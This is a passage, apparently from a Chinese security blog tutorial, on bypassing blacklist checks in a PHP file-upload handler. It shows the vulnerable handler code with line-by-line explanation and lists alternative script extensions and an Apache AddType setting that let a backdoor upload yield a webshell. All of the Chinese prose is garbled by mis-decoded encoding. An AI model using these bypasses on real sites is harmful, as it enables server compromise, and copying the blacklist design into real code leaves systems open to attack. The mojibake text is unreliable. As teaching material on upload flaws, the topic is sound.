class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>move_uploaded_file($temp_file, $img_path)</code>ï¼šå°†ä¸´æ—¶æ–‡ä»¶ä»<code>$temp_file</code>ç§»åŠ¨åˆ°ç›®æ ‡è·¯å¾„<code>$img_path</code>ã€‚<ul><li>å¦‚æœç§»åŠ¨æˆåŠŸï¼Œè®¾ç½®<code>$is_upload</code>ä¸º<code>true</code>ï¼Œè¡¨ç¤ºä¸Šä¼ æˆåŠŸã€‚</li><li>å¦‚æœç§»åŠ¨å¤±è´¥ï¼Œè®¾ç½®é”™è¯¯æ¶ˆæ¯ä¸ºâ€œä¸Šä¼ å‡ºé”™ï¼â€ã€‚</li></ul></li></ul><h4 id="8-æ–‡ä»¶ç±»å‹ä¸ç¬¦åˆè¦æ±‚"><a href="#8-æ–‡ä»¶ç±»å‹ä¸ç¬¦åˆè¦æ±‚" class="headerlink" title="8. æ–‡ä»¶ç±»å‹ä¸ç¬¦åˆè¦æ±‚"></a>8. æ–‡ä»¶ç±»å‹ä¸ç¬¦åˆè¦æ±‚</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>å¦‚æœæ–‡ä»¶ç±»å‹ä¸ç¬¦åˆè¦æ±‚ï¼ˆå³ä¸æ˜¯<code>image/jpeg</code>ã€<code>image/png</code>æˆ–<code>image/gif</code>ï¼‰ï¼Œè®¾ç½®é”™è¯¯æ¶ˆæ¯ä¸ºâ€œæ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼â€ã€‚</li></ul><h4 id="9-ä¸Šä¼ ç›®å½•ä¸å­˜åœ¨"><a href="#9-ä¸Šä¼ ç›®å½•ä¸å­˜åœ¨" class="headerlink" title="9. ä¸Šä¼ ç›®å½•ä¸å­˜åœ¨"></a>9. ä¸Šä¼ ç›®å½•ä¸å­˜åœ¨</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>å¦‚æœä¸Šä¼ ç›®å½•<code>UPLOAD_PATH</code>ä¸å­˜åœ¨ï¼Œè®¾ç½®é”™è¯¯æ¶ˆæ¯ä¸ºâ€œæ–‡ä»¶å¤¹ä¸å­˜åœ¨ï¼Œè¯·æ‰‹å·¥åˆ›å»ºï¼â€ã€‚</li></ul><h2 id="2-5-5-ç»•è¿‡é»‘åå•ä¸Šä¼ "><a href="#2-5-5-ç»•è¿‡é»‘åå•ä¸Šä¼ " class="headerlink" title="2.5.5 ç»•è¿‡é»‘åå•ä¸Šä¼ "></a>2.5.5 ç»•è¿‡é»‘åå•ä¸Šä¼ </h2><h3 id="ç»•è¿‡é»‘åå•ä¸Šä¼ çš„æ”»å‡»"><a href="#ç»•è¿‡é»‘åå•ä¸Šä¼ çš„æ”»å‡»" class="headerlink" title="ç»•è¿‡é»‘åå•ä¸Šä¼ çš„æ”»å‡»"></a>ç»•è¿‡é»‘åå•ä¸Šä¼ çš„æ”»å‡»</h3><p>ä¸Šä¼ å›¾ç‰‡æ—¶ï¼Œå¦‚æœ<strong>æç¤ºä¸å…è®¸ phpã€asp è¿™ç§ä¿¡æ¯æç¤ºï¼Œå¯åˆ¤æ–­ä¸ºé»‘åå•é™åˆ¶</strong>ï¼Œä¸Šä¼ é»‘åå•ä»¥å¤–çš„åç¼€åå³å¯ã€‚</p><p>åœ¨ iis é‡Œ asp ç¦æ­¢ä¸Šä¼ äº†ï¼Œå¯ä»¥ä¸Šä¼  asa cer cdx è¿™äº›åç¼€ï¼Œå¦‚åœ¨ç½‘ç«™é‡Œå…è®¸.net æ‰§è¡Œ å¯ä»¥ä¸Šä¼  ashx ä»£æ›¿ aspxã€‚å¦‚æœç½‘ç«™å¯ä»¥æ‰§è¡Œè¿™äº›è„šæœ¬ï¼Œé€šè¿‡ä¸Šä¼ åé—¨å³å¯è·å– webshellã€‚</p><p>åœ¨<strong>ä¸åŒçš„ä¸­é—´ä»¶ä¸­æœ‰ç‰¹æ®Šçš„æƒ…å†µ</strong>ï¼Œ&#x3D;&#x3D;å¦‚æœåœ¨ apache å¯ä»¥å¼€å¯ application&#x2F;x-httpd-php&#x3D;&#x3D;</p><p>&#x3D;&#x3D;åœ¨ AddType application&#x2F;x-httpd-php .php .phtml .php3&#x3D;&#x3D;</p><p>åç¼€åä¸º phtml ã€php3 å‡è¢«è§£ææˆ php æœ‰çš„ apache ç‰ˆæœ¬é»˜è®¤å°±ä¼šå¼€å¯ã€‚</p><p>ä¸Šä¼ ç›®æ ‡ä¸­é—´ä»¶å¯æ”¯æŒçš„ç¯å¢ƒçš„è¯­è¨€è„šæœ¬å³å¯ï¼Œå¦‚.phtmlã€php3ã€‚</p><h3 id="ç»•è¿‡é»‘åå•ä¸Šä¼ çš„åŸç†"><a href="#ç»•è¿‡é»‘åå•ä¸Šä¼ çš„åŸç†" class="headerlink" title="ç»•è¿‡é»‘åå•ä¸Šä¼ çš„åŸç†"></a>ç»•è¿‡é»‘åå•ä¸Šä¼ çš„åŸç†</h3><p>ä¸Šä¼ æ¨¡å—ï¼Œæœ‰æ—¶å€™ä¼šå†™æˆé»‘åå•é™åˆ¶ï¼Œåœ¨ä¸Šä¼ æ–‡ä»¶çš„æ—¶è·å–åç¼€åï¼Œå†æŠŠåç¼€åä¸ç¨‹åºä¸­é»‘åå•è¿›è¡Œæ£€æµ‹ï¼Œå¦‚æœåç¼€ååœ¨é»‘åå•çš„åˆ—è¡¨å†…ï¼Œæ–‡ä»¶å°†ç¦æ­¢æ–‡ä»¶ä¸Šä¼ ã€‚<br><strong>é»‘åå•å³ç¦æ­¢å“ªäº›è¿›å…¥ï¼›ä¸ç”¨é»‘åå•ä¸­çš„å³å¯ï¼›</strong></p><h3 id="é»‘åå•ä¸Šä¼ çš„ä»£ç åˆ†æ"><a href="#é»‘åå•ä¸Šä¼ çš„ä»£ç åˆ†æ" class="headerlink" title="é»‘åå•ä¸Šä¼ çš„ä»£ç åˆ†æ"></a>é»‘åå•ä¸Šä¼ çš„ä»£ç åˆ†æ</h3><p>é¦–å…ˆæ˜¯æ£€æµ‹ submit æ˜¯å¦æœ‰å€¼ï¼Œè·å–æ–‡ä»¶çš„åç¼€åï¼Œè¿›è¡Œé»‘åå•å¯¹æ¯”ï¼Œåç¼€åä¸åœ¨é»‘åå•å†…ï¼Œå…è®¸ä¸Šä¼ ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//æ”¶å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">``````</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è¿™æ®µPHPä»£ç æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ å¤„ç†è„šæœ¬ï¼Œä¸»è¦ç”¨äºæ¥æ”¶ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶ï¼Œå¹¶æ ¹æ®æ–‡ä»¶æ‰©å±•åè¿›è¡Œå®‰å…¨æ€§æ£€æŸ¥ã€‚ä»¥ä¸‹æ˜¯ä»£ç çš„è¯¦ç»†è§£é‡Šï¼ŒåŒ…æ‹¬è¯­æ³•å’Œé€»è¾‘ã€‚</span><br><span class="line"></span><br><span class="line"><span class="comment">### ä»£ç ç»“æ„</span></span><br><span class="line">```php</span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>; <span class="comment">// åˆå§‹åŒ–ä¸Šä¼ çŠ¶æ€ä¸ºfalse</span></span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>; <span class="comment">// åˆå§‹åŒ–é”™è¯¯æ¶ˆæ¯ä¸ºç©º</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123; <span class="comment">// æ£€æŸ¥æ˜¯å¦æäº¤äº†è¡¨å•</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123; <span class="comment">// æ£€æŸ¥ä¸Šä¼ ç›®å½•æ˜¯å¦å­˜åœ¨</span></span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>); <span class="comment">// å®šä¹‰ç¦æ­¢ä¸Šä¼ çš„æ–‡ä»¶æ‰©å±•å</span></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]); <span class="comment">// è·å–ä¸Šä¼ æ–‡ä»¶çš„åŸå§‹æ–‡ä»¶åå¹¶å»é™¤é¦–å°¾ç©ºæ ¼</span></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>); <span class="comment">// åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ï¼ˆå‡è®¾deldotæ˜¯è‡ªå®šä¹‰å‡½æ•°ï¼‰</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>); <span class="comment">// è·å–æ–‡ä»¶æ‰©å±•å</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">// å°†æ‰©å±•åè½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>); <span class="comment">// å»é™¤å­—ç¬¦ä¸²::$DATAï¼ˆé˜²æ­¢NTFSæµæ”»å‡»ï¼‰</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">// å»é™¤æ‰©å±•åé¦–å°¾çš„ç©ºæ ¼</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123; <span class="comment">// æ£€æŸ¥æ‰©å±•åæ˜¯å¦åœ¨ç¦æ­¢åˆ—è¡¨ä¸­</span></span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]; <span class="comment">// è·å–ä¸´æ—¶æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>; <span class="comment">// ç”Ÿæˆç›®æ ‡æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123; <span class="comment">// å°†ä¸´æ—¶æ–‡ä»¶ç§»åŠ¨åˆ°ç›®æ ‡è·¯å¾„</span></span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>; <span class="comment">// è®¾ç½®ä¸Šä¼ çŠ¶æ€ä¸ºtrue</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>; <span class="comment">// ä¸Šä¼ å¤±è´¥ï¼Œè®¾ç½®é”™è¯¯æ¶ˆæ¯</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼&#x27;</span>; <span class="comment">// æ‰©å±•ååœ¨ç¦æ­¢åˆ—è¡¨ä¸­ï¼Œè®¾ç½®é”™è¯¯æ¶ˆæ¯</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>; <span class="comment">// ä¸Šä¼ ç›®å½•ä¸å­˜åœ¨ï¼Œè®¾ç½®é”™è¯¯æ¶ˆæ¯</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ä»£ç è¯¦ç»†è§£é‡Š-1"><a href="#ä»£ç è¯¦ç»†è§£é‡Š-1" class="headerlink" title="ä»£ç è¯¦ç»†è§£é‡Š"></a>ä»£ç è¯¦ç»†è§£é‡Š</h3><h4 id="1-åˆå§‹åŒ–å˜é‡-1"><a href="#1-åˆå§‹åŒ–å˜é‡-1" class="headerlink" title="1. åˆå§‹åŒ–å˜é‡"></a>1. åˆå§‹åŒ–å˜é‡</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>; <span class="comment">// åˆå§‹åŒ–ä¸Šä¼ çŠ¶æ€ä¸ºfalse</span></span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>; <span class="comment">// åˆå§‹åŒ–é”™è¯¯æ¶ˆæ¯ä¸ºç©º</span></span><br></pre></td></tr></table></figure><ul><li><code>$is_upload</code>ï¼šå¸ƒå°”å˜é‡ï¼Œç”¨äºæ ‡è®°æ–‡ä»¶æ˜¯å¦ä¸Šä¼ æˆåŠŸã€‚</li><li><code>$msg</code>ï¼šç”¨äºå­˜å‚¨é”™è¯¯æ¶ˆæ¯æˆ–æç¤ºä¿¡æ¯ã€‚</li></ul><h4 id="2-æ£€æŸ¥è¡¨å•æ˜¯å¦æäº¤-1"><a href="#2-æ£€æŸ¥è¡¨å•æ˜¯å¦æäº¤-1" class="headerlink" title="2. æ£€æŸ¥è¡¨å•æ˜¯å¦æäº¤"></a>2. æ£€æŸ¥è¡¨å•æ˜¯å¦æäº¤</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br></pre></td></tr></table></figure><ul><li><code>$_POST[&#39;submit&#39;]</code>ï¼šæ£€æŸ¥è¡¨å•æ˜¯å¦é€šè¿‡POSTæ–¹æ³•æäº¤ã€‚<code>submit</code>æ˜¯è¡¨å•ä¸­æäº¤æŒ‰é’®çš„åç§°ã€‚</li><li><code>isset()</code>ï¼šæ£€æŸ¥å˜é‡æ˜¯å¦å·²è®¾ç½®ä¸”ä¸ä¸º<code>null</code>ã€‚</li></ul><h4 id="3-æ£€æŸ¥ä¸Šä¼ ç›®å½•æ˜¯å¦å­˜åœ¨-1"><a href="#3-æ£€æŸ¥ä¸Šä¼ ç›®å½•æ˜¯å¦å­˜åœ¨-1" class="headerlink" title="3. æ£€æŸ¥ä¸Šä¼ ç›®å½•æ˜¯å¦å­˜åœ¨"></a>3. æ£€æŸ¥ä¸Šä¼ ç›®å½•æ˜¯å¦å­˜åœ¨</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br></pre></td></tr></table></figure><ul><li><code>UPLOAD_PATH</code>ï¼šå¸¸é‡ï¼Œè¡¨ç¤ºæ–‡ä»¶ä¸Šä¼ çš„ç›®æ ‡ç›®å½•è·¯å¾„ã€‚</li><li><code>file_exists()</code>ï¼šæ£€æŸ¥æŒ‡å®šè·¯å¾„çš„æ–‡ä»¶æˆ–ç›®å½•æ˜¯å¦å­˜åœ¨ã€‚</li></ul><h4 id="4-å®šä¹‰ç¦æ­¢ä¸Šä¼ çš„æ–‡ä»¶æ‰©å±•å"><a href="#4-å®šä¹‰ç¦æ­¢ä¸Šä¼ çš„æ–‡ä»¶æ‰©å±•å" class="headerlink" title="4. å®šä¹‰ç¦æ­¢ä¸Šä¼ çš„æ–‡ä»¶æ‰©å±•å"></a>4. å®šä¹‰ç¦æ­¢ä¸Šä¼ çš„æ–‡ä»¶æ‰©å±•å</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br></pre></td></tr></table></figure><ul><li>å®šä¹‰ä¸€ä¸ªæ•°ç»„ï¼ŒåŒ…å«ä¸å…è®¸ä¸Šä¼ çš„æ–‡ä»¶æ‰©å±•åã€‚</li></ul><h4 id="5-è·å–å¹¶å¤„ç†ä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶å"><a href="#5-è·å–å¹¶å¤„ç†ä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶å" class="headerlink" title="5. è·å–å¹¶å¤„ç†ä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶å"></a>5. è·å–å¹¶å¤„ç†ä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶å</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]); <span class="comment">// è·å–æ–‡ä»¶åå¹¶å»é™¤é¦–å°¾ç©ºæ ¼</span></span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>); <span class="comment">// åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br></pre></td></tr></table></figure><ul><li><code>$_FILES[&#39;upload_file&#39;][&#39;name&#39;]</code>ï¼šè·å–ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶çš„åŸå§‹æ–‡ä»¶åã€‚</li><li><code>trim()</code>ï¼šå»é™¤å­—ç¬¦ä¸²é¦–å°¾çš„ç©ºæ ¼ã€‚</li><li><code>deldot()</code>ï¼šè‡ªå®šä¹‰å‡½æ•°ï¼Œç”¨äºåˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ï¼ˆ<code>.</code>ï¼‰ã€‚å¯èƒ½æ˜¯ä¸ºäº†é˜²æ­¢ç±»ä¼¼<code>test.php.</code>çš„æ–‡ä»¶åç»•è¿‡æ‰©å±•åæ£€æŸ¥ã€‚</li></ul><h4 id="6-æå–æ–‡ä»¶æ‰©å±•å"><a href="#6-æå–æ–‡ä»¶æ‰©å±•å" class="headerlink" title="6. æå–æ–‡ä»¶æ‰©å±•å"></a>6. æå–æ–‡ä»¶æ‰©å±•å</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>); <span class="comment">// è·å–æ–‡ä»¶æ‰©å±•å</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">// è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>); <span class="comment">// å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">// å»é™¤æ‰©å±•åé¦–å°¾çš„ç©ºæ ¼</span></span><br></pre></td></tr></table></figure><ul><li><code>strrchr($file_name, &#39;.&#39;)</code>ï¼šä»æ–‡ä»¶åä¸­æå–æœ€åä¸€ä¸ª<code>.</code>åŠå…¶åé¢çš„å†…å®¹ï¼Œå³æ–‡ä»¶æ‰©å±•åã€‚</li><li><code>strtolower()</code>ï¼šå°†æ‰©å±•åè½¬æ¢ä¸ºå°å†™ï¼Œç¡®ä¿åç»­æ¯”è¾ƒä¸å—å¤§å°å†™å½±å“ã€‚</li><li><code>str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext)</code>ï¼šå»é™¤æ‰©å±•åä¸­çš„<code>::$DATA</code>å­—ç¬¦ä¸²ã€‚è¿™æ˜¯ä¸ºäº†é˜²æ­¢NTFSæµæ”»å‡»ï¼Œæ”»å‡»è€…å¯èƒ½åˆ©ç”¨<code>test.php::$DATA</code>ç»•è¿‡æ‰©å±•åæ£€æŸ¥ã€‚</li><li><code>trim()</code>ï¼šå»é™¤æ‰©å±•åé¦–å°¾çš„ç©ºæ ¼ã€‚</li></ul><h4 id="7-æ£€æŸ¥æ–‡ä»¶æ‰©å±•åæ˜¯å¦åœ¨ç¦æ­¢åˆ—è¡¨ä¸­"><a href="#7-æ£€æŸ¥æ–‡ä»¶æ‰©å±•åæ˜¯å¦åœ¨ç¦æ­¢åˆ—è¡¨ä¸­" class="headerlink" title="7. æ£€æŸ¥æ–‡ä»¶æ‰©å±•åæ˜¯å¦åœ¨ç¦æ­¢åˆ—è¡¨ä¸­"></a>7. æ£€æŸ¥æ–‡ä»¶æ‰©å±•åæ˜¯å¦åœ¨ç¦æ­¢åˆ—è¡¨ä¸­</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br></pre></td></tr></table></figure><ul><li><code>in_array($file_ext, $deny_ext)</code>ï¼šæ£€æŸ¥æ–‡ä»¶æ‰©å±•åæ˜¯å¦åœ¨ç¦æ­¢åˆ—è¡¨<code>$deny_ext</code>ä¸­ã€‚</li><li>å¦‚æœæ‰©å±•åä¸åœ¨ç¦æ­¢åˆ—è¡¨ä¸­ï¼Œç»§ç»­åç»­æ“ä½œï¼›å¦åˆ™ï¼Œè®¾ç½®é”™è¯¯æ¶ˆæ¯å¹¶ç»ˆæ­¢å¤„ç†ã€‚</li></ul><h4 id="8-ç”Ÿæˆç›®æ ‡æ–‡ä»¶è·¯å¾„"><a href="#8-ç”Ÿæˆç›®æ ‡æ–‡ä»¶è·¯å¾„" class="headerlink" title="8. ç”Ÿæˆç›®æ ‡æ–‡ä»¶è·¯å¾„"></a>8. ç”Ÿæˆç›®æ ‡æ–‡ä»¶è·¯å¾„</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]; <span class="comment">// è·å–ä¸´æ—¶æ–‡ä»¶è·¯å¾„</span></span><br><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>; <span class="comment">// ç”Ÿæˆç›®æ ‡æ–‡ä»¶è·¯å¾„</span></span><br></pre></td></tr></table></figure><ul><li><code>$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]</code>ï¼šè·å–ä¸Šä¼ æ–‡ä»¶çš„ä¸´æ—¶å­˜å‚¨è·¯å¾„ã€‚</li><li><code>UPLOAD_PATH</code>ï¼šç›®æ ‡ä¸Šä¼ ç›®å½•ã€‚</li><li><code>date(&quot;YmdHis&quot;)</code>ï¼šç”Ÿæˆå½“å‰æ—¶é—´æˆ³ï¼Œæ ¼å¼ä¸º<code>YYYYMMDDHHMMSS</code>ã€‚</li><li><code>rand(1000,9999)</code>ï¼šç”Ÿæˆä¸€ä¸ªéšæœºæ•°ï¼ŒèŒƒå›´ä¸º1000åˆ°9999ã€‚</li><li><code>$img_path</code>ï¼šæ‹¼æ¥ç”Ÿæˆæœ€ç»ˆçš„ç›®æ ‡æ–‡ä»¶è·¯å¾„ï¼Œæ ¼å¼ä¸º<code>UPLOAD_PATH/YYYYMMDDHHMMSSéšæœºæ•°.æ‰©å±•å</code>ã€‚</li></ul><h4 id="9-ç§»åŠ¨ä¸Šä¼ æ–‡ä»¶"><a href="#9-ç§»åŠ¨ä¸Šä¼ æ–‡ä»¶" class="headerlink" title="9. ç§»åŠ¨ä¸Šä¼ æ–‡ä»¶"></a>9. ç§»åŠ¨ä¸Šä¼ æ–‡ä»¶</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">    <span class="variable">$is_upload</span> = <span class="literal">true</span>; <span class="comment">// 